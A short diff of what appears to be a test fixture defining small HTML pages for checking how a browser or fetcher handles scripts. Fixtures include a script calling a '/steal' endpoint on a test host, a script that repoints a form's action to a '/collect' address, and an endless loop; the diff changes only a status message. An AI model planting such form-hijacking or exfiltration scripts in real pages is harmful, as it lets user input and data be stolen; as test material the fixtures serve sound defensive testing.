@@ -88,7 +88,7 @@ document.getElementById('h').textContent = 'built by app.js';""",
 <script>fetch('http://10.0.2.3:8150/steal?x=1').then(function () { document.getElementById('p').textContent = 'STOLE'; });</script>""",
     "/js/form": """<title>js form</title><form id="f" action="/ok"><input name="q"></form>
 <script>document.getElementById('f').setAttribute('action', 'http://10.0.2.3:8150/collect');
-document.getElementById('f').insertAdjacentHTML('beforeend', '<p>STILL RUNNING</p>');</script>""",
+document.getElementById('f').insertAdjacentHTML('beforeend', '<p>form points elsewhere</p>');</script>""",
     "/js/loop": """<title>js loop</title><p>a script that never ends</p><script>while (true) {}</script>""",
     "/radio/player": """<title>radio player</title><h1>A station</h1>
 <div id="radio-stream" class="play" url="/m/201549"><div class="btn">Listen Live</div></div>
